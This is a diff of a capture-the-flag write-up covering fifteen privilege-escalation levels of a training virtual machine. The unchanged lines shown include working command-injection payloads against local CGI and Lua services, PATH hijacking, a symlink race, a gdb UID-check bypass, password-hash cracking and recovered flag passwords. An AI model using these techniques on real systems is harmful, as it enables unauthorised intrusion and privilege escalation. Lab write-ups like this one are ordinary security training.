@@ -1,10 +1,12 @@
-## level00
+
+## TEST
 
 The goal was to explore the Virtual Machine.
 
 After a while, we executed `ls -lah` in `/usr/sbin` and found a suspicious non-executable file called john. We could have found it faster with `find / -user flag00 2>/dev/null` since we already knew the user from `cat /etc/passwd`.
 
 `/usr/sbin/john` contains `cdiiddwpgswtgt`. This was not the `flag00` password but we quickly guessed that it was a Caesar Cipher. [dcode.fr](https://www.dcode.fr/caesar-cipher) found the password `nottoohardhere`.
+
 
 
 ## level01
@@ -19,6 +21,7 @@ Copy `flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash` to `flag01.pa
 
 `john level01.passwd` -> abcdefg (flag01)
 
+
 ## level02
 
 We have a `level02.pcap` file in the home folder. This is a "packet capture" file.
@@ -31,6 +34,7 @@ chmod 400 level02.pcap
 We will use Wireshark to analyse the packets. Packet 43 has the string `Password:` so we follow it. All the following packets alternate lengths between 66 and 67, but the TCP packet is 66 characters long, so it seems the character is sent character by character with an acknowledgement everytime.
 
 Right click on packet 43 -> Follow -> TCP Stream. `Password: ft_wandr...NDRel.L0L`. We can look at the dots and see that their value is `7f` which is the `DEL` character. The password is then `ft_waNDReL0L`.
+
 
 ## level03
 
@@ -58,11 +62,13 @@ chmod +x /tmp/echo
 PATH="/tmp:$PATH" ./level03
 ```
 
+
 ## level04
 
 There is a perl CGI running on port 4747. It displays the query parameter `x`. Since Perl calls shell code with our string, we can inject a `` `getflag` `` in the command. We make sure getflag is not executed on our side by adding single quotes around the `curl` argument.
 
 ``curl 'localhost:4747?x=`getflag`'``
+
 
 ## level05
 
@@ -81,6 +87,7 @@ echo '#!/bin/sh' > /opt/openarenaserver/lol.sh
 echo 'getflag | wall' >> /opt/openarenaserver/lol.sh
 chmod +x /opt/openarenaserver/lol.sh
 ```
+
 
 ## level06
 
@@ -150,6 +157,7 @@ WINNER:
 Why is the curly bracket syntax so hard to find online? Why doesn't it work with quotes around `getflag`? Why was it impossible to concatenate strings? These are many questions we will never have the answer to.
 
 
+
 ## level07
 
 A refreshing reverse engineering challenge after the PHP brain rot.
@@ -205,6 +213,7 @@ This program tries to display the value contained in `LOGNAME`, but is susceptib
 
 ``LOGNAME='"`getflag`"' ./level07``
 
+
 ## level08
 
 There is an unreadable token file and a `level08` executable with the setuid bit set. We disassembled the binary and came up with this approximate C code:
@@ -245,6 +254,7 @@ ln -s /home/user/level08/token /tmp/link
 
 We lost some time trying to understand why we couldn't connect to `level09` with the token, even trying John the Ripper on it, until we realized we still needed to log to `flag08` and execute `getflag` here.
 
+
 ## level09
 
 There is an executable at the root. There is also a token file containing `f4kmm6p|=�p�n��DB�Du{��`.
@@ -274,6 +284,7 @@ We wrote a Python one-liner to reverse this process.
 `python -c "print(''.join(chr(ord(c)-i) for i,c in enumerate(open('token', 'rb').read().strip())))"`
 
 Which yields this token-looking token: `f3iji1ju5yuevaus41q1afiuq`.
+
 
 ## level10
 
@@ -306,6 +317,7 @@ kill $(jobs -p)
 
 Running this script will sometimes fail the `access` check and sometimes fail the `read` of the file. But if the timing is right, it will `access` `/etc/passwd` and `read+send` `/home/user/level10/token` to the host machine: `woupa2yuojeeaaed06riuj63c`.
 
+
 ## level11
 
 There is a Lua script running on port 5151 that is listening for a password, hashing it with `sha1sum` and checking the hash.
@@ -315,6 +327,7 @@ https://www.dcode.fr/sha1-hash found the password `NotSoEasy`. But `echo -n 'Not
 Reading the script more carefully showed a possible command injection. `io.popen` is similar to `system` in C, PHP and other languages.
 
 ``echo '`getflag | wall`' | nc localhost 5151``
+
 
 ## level12
 
@@ -375,6 +388,7 @@ $ chmod +x /tmp/REKT
 $ curl 'http://localhost:4646?x=`/*/REKT`'
 ```
 
+
 ## level13
 
 Once again a reverse-engineering challenge. Launching the program gives `UID 2013 started us but we we expect 4242`. We we need to avoid the uid check somehow.
@@ -424,6 +438,7 @@ There are several methods, like changing the value of the variable `uid`. But th
 (gdb) continue
 ```
 
+
 ## level14
 
 There is nothing. No file. No special permission. No service running.
@@ -459,4 +474,5 @@ The blocks are not in order so we need to find the one for `flag14`. It has UID 
 ```
 
 The program smashes the stack but not after yielding the final flag: `7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ`.
+
 
